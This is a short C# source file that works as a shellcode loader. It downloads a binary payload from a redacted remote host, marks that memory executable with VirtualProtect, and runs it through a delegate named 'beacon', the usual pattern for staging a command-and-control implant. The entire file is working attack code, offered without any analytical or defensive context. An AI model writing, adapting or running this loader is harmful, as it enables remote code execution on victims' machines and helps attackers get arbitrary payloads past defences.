using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Reflection
{
    public class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void beacon();

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        public static void Main()
        {
            WebClient wc = new WebClient();
            byte[] sc = wc.DownloadData("http://XXXX/op.bin");

            GCHandle pinned = GCHandle.Alloc(sc, GCHandleType.Pinned);
            IntPtr ptr = pinned.AddrOfPinnedObject();

            uint oldProtect;
            VirtualProtect(ptr, (UIntPtr)sc.Length, 0x40, out oldProtect);

            beacon exec = (beacon)Marshal.GetDelegateForFunctionPointer(
                ptr,
                typeof(beacon)
            );

            exec();
        }
    }
}